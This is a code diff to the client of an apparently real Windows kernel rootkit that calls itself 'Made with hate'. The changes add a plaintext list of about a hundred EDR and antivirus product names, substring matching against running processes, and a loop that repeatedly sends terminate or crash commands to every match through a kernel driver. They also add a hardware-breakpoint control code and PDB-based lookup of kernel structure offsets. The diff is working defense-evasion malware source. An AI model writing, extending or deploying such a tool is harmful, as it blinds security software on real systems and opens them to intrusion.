@@ -6,17 +6,23 @@
 #include <tlhelp32.h>
 #include <wincrypt.h>
 #include "EzPdb.h"
+#include <shlwapi.h>
+
 
 
 // Link with required libraries
 #pragma comment (lib, "Crypt32.lib")
 #pragma comment (lib, "Dbghelp.lib")
+#pragma comment (lib, "Shlwapi.lib")
+
 
 
 
 int stop_term_thread = 0;
 int stop_crash_thread = 0;
 int stop_unmap_thread = 0;
+std::string pdbPath;
+
 
 struct threadArgs {
     HANDLE hDevice;
@@ -52,6 +58,7 @@ struct threadArgs {
 #define IOCTL_LIST_OBJ_CALLBACKS CTL_CODE_HIDE(18)
 #define IOCTL_LIST_MINIFILTERS CTL_CODE_HIDE(19)
 #define IOCTL_REM_MINIFILTER_CALLBACK CTL_CODE_HIDE(20)
+#define IOCTL_SETUP_HW_BRKP CTL_CODE_HIDE(21)
 
 
 #pragma warning (disable: 4996)
@@ -152,6 +159,41 @@ const char* monitoredDrivers[] = {
 	"tedrpers.sys", "telam.sys", "cyvrlpc.sys", "MpKslf8d86dba.sys", "mssecflt.sys"
 };
 
+const char* g_edrlist[] = {
+    "activeconsole", "anti malware",    "anti-malware",
+    "antimalware",   "anti virus",      "anti-virus",
+    "antivirus",     "appsense",        "authtap",
+    "avast",         "avecto",          "canary",
+    "carbonblack",   "carbon black",    "cb.exe",
+    "ciscoamp",      "cisco amp",       "countercept",
+    "countertack",   "cramtray",        "crssvc",
+    "crowdstrike",   "csagent",         "csfalcon",
+    "csshell",       "cybereason",      "cyclorama",
+    "cylance",       "cyoptics",        "cyupdate",
+    "cyvera",        "cyserver",        "cytray",
+    "darktrace",     "defendpoint",     "defender",
+    "eectrl",        "elastic",         "endgame",
+    "f-secure",      "forcepoint",      "fireeye",
+    "groundling",    "GRRservic",       "inspector",
+    "ivanti",        "kaspersky",       "lacuna",
+    "logrhythm",     "malware",         "mandiant",
+    "mcafee",        "morphisec",       "msascuil",
+    "msmpeng",       "nissrv",          "omni",
+    "omniagent",     "osquery",         "palo alto networks",
+    "pgeposervice",  "pgsystemtray",    "privilegeguard",
+    "procwall",      "protectorservic", "qradar",
+    "redcloak",      "secureworks",     "securityhealthservice",
+    "semlaunchsv",   "sentinel",        "sepliveupdat",
+    "sisidsservice", "sisipsservice",   "sisipsutil",
+    "smc.exe",       "smcgui",          "snac64",
+    "sophos",        "splunk",          "srtsp",
+    "symantec",      "symcorpu",        "symefasi",
+    "sysinternal",   "sysmon",          "tanium",
+    "tda.exe",       "tdawork",         "tpython",
+    "vectra",        "wincollect",      "windowssensor",
+    "wireshark",     "threat",          "xagt.exe",
+    "xagtnotif.exe" ,"mssense" };
+
 const wchar_t* monitoredMinifilters[] = {
     L"EX64", L"Eng64", L"teefer2", L"teefer3", L"srtsp64",
     L"srtspx64", L"srtspl64", L"Ironx64", L"fekern", L"cbk7",
@@ -181,7 +223,7 @@ const wchar_t* monitoredMinifilters[] = {
 
 typedef LONG(WINAPI* RtlGetVersionPtr)(PRTL_OSVERSIONINFOW);
 
-
+EZPDB pdb = { 0 };
 
 BOOL Terminate(HANDLE, DWORD);
 DWORD FindProcessId(const char*);
@@ -291,21 +333,40 @@ offsets getOffsetByBuild(void) {
 
 offsets getOffsetswithPdb() {
     offsets offs = { 0 };
-    std::string kernel = std::string(std::getenv("systemroot")) + "\\System32\\ntoskrnl.exe";
-    std::string pdbPath = EzPdbDownload(kernel);
+    CHAR input[256];
 
+    //printf("Downloading pdb files\n");
+    if (!pdb.hPdbFile) {
+        printf("Do You want to download pdb or use local pdb file?\n");
+        printf("[1] Download\n[2] Local file\n");
+        printf("> ");
+
+        fgets(input, 256, stdin);
+        if (strncmp(input, "1", 1) == 0) {
+            std::string kernel = std::string(std::getenv("systemroot")) + "\\System32\\ntoskrnl.exe";
+            std::cout << "downloading pdb for " << kernel << std::endl;
+            pdbPath = EzPdbDownload(kernel);
+
+        }
+        else {
+            printf("Specify the path: ");
+            std::cin >> pdbPath;
+        }
+    }
     if (pdbPath.empty())
     {
         std::cout << "download pdb failed " << GetLastError() << std::endl;;
         return offs;
     }
 
-    EZPDB pdb;
+
     if (!EzPdbLoad(pdbPath, &pdb))
     {
         std::cout << "load pdb failed " << GetLastError() << std::endl;
         return offs;
     }
+
+    
 
     //ULONG rva = EzPdbGetRva(&pdb, "NtTerminateThread");
     ULONG tokenOffset = EzPdbGetStructPropertyOffset(&pdb, "_EPROCESS", L"Token");
@@ -374,6 +435,39 @@ DWORD FindProcessId(const char* processName) {
     return processId;
 }
 
+DWORD FindProcessIdcontain(const char* processName) {
+
+    // Convert process name to wide char for comparison
+    size_t wcharCount = mbstowcs(NULL, processName, 0) + 1;
+    wchar_t* wprocessName = (wchar_t*)malloc(wcharCount * sizeof(wchar_t));
+    if (!wprocessName) {
+        return 0;
+    }
+    mbstowcs(wprocessName, processName, wcharCount);
+
+    DWORD64 processId = 0;
+
+    // Take a snapshot of all running processes
+    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    if (snapshot != INVALID_HANDLE_VALUE) {
+        PROCESSENTRY32 processEntry;
+        processEntry.dwSize = sizeof(PROCESSENTRY32);
+
+        // Iterate through all processes to find a match
+        if (Process32First(snapshot, &processEntry)) {
+            do {
+                if (StrStrIW(processEntry.szExeFile, wprocessName) != NULL) {
+                    processId = processEntry.th32ProcessID;
+                    break;
+                }
+            } while (Process32Next(snapshot, &processEntry));
+        }
+        CloseHandle(snapshot);
+    }
+
+    free(wprocessName);
+    return processId;
+}
 // Decode Base64 encoded process name
 char* base64_decode(const char* input) {
     DWORD decodedSize = 0;
@@ -458,7 +552,7 @@ void killer_callback(threadArgs* args) {
     HANDLE hDevice = args->hDevice;
     int mode = args->mode;
 
-	int edrCount = sizeof(edrNames) / sizeof(edrNames[0]);
+	int edrCount = sizeof(g_edrlist) / sizeof(g_edrlist[0]);
 
 	int stop_what = 0;
     if (mode == 1) {
@@ -476,11 +570,13 @@ void killer_callback(threadArgs* args) {
 
     while (!stop_what) {
         for (size_t i = 0; i < edrCount; i++) {
-            char* decodedName = base64_decode(edrNames[i]);
-            if (decodedName) {
-                DWORD pid = FindProcessId(decodedName);
+            //char* decodedName = base64_decode(g_edrlist[i]);
+            //char* decodedName = (char*)g_edrlist[i];
+
+            if (g_edrlist[i]) {
+                DWORD pid = FindProcessIdcontain(g_edrlist[i]);
                 if (pid != 0) {
-                    printf("Found EDR process: %s with PID %lu\n", decodedName, pid);
+                    printf("Found EDR process: %s with PID %lu\n", g_edrlist[i], pid);
                     DWORD bytesReturned;
                     BOOL result;
                     if (mode == 1){
@@ -494,19 +590,20 @@ void killer_callback(threadArgs* args) {
                     }
                     else {
                         fprintf(stderr, "Invalid mode selected.\n");
-                        free(decodedName);
+                     
                         return;
 					}
                     if (result) {
-                        printf("Sent crash command to process %s (PID %lu)\n", decodedName, pid);
+                        printf("Sent crash command to process %s (PID %lu)\n", g_edrlist[i], pid);
                     }
                     else {
                         fprintf(stderr, "Failed to send crash command. Error: %lu\n", GetLastError());
                     }
                 }
-                free(decodedName);
+                
             }
         }
+        Sleep(1000);
     }
 }
 
@@ -1285,19 +1382,7 @@ BOOL DisableWinThreatIntellig(HANDLE hDevice) {
 
 int main(int argc, char* argv[])
 {
-    HANDLE hDevice = CreateFileA(
-        "\\\\.\\SnitchHunt",                // Device name
-        GENERIC_READ | GENERIC_WRITE,      // Desired access
-        0,                                  // Share mode
-        NULL,                               // Security attributes
-        OPEN_EXISTING,                      // Creation disposition
-        FILE_ATTRIBUTE_NORMAL,              // Flags and attributes
-		NULL);                              // Template file
 
-    const size_t edrCount = sizeof(edrNames) / sizeof(edrNames[0]);
-    HANDLE hTerminateThread;
-	HANDLE hCrashThread;
-	HANDLE hUnmapThread;
 
     printf("\n");
     printf("   ____  _   _ ___ _____ ____ _   _    ____  _        _ __   _______ ____  \n");
@@ -1309,6 +1394,19 @@ int main(int argc, char* argv[])
 
     printf("Windows KM Rootkit Made with hate by jakydibe https://github.com/jakydibe\n");
 
+    HANDLE hDevice = CreateFileA(
+        "\\\\.\\SnitchHunt",                // Device name
+        GENERIC_READ | GENERIC_WRITE,      // Desired access
+        0,                                  // Share mode
+        NULL,                               // Security attributes
+        OPEN_EXISTING,                      // Creation disposition
+        FILE_ATTRIBUTE_NORMAL,              // Flags and attributes
+        NULL);                              // Template file
+
+    const size_t edrCount = sizeof(edrNames) / sizeof(edrNames[0]);
+    HANDLE hTerminateThread;
+    HANDLE hCrashThread;
+    HANDLE hUnmapThread;
 
     while (1) {
 		char input[256];
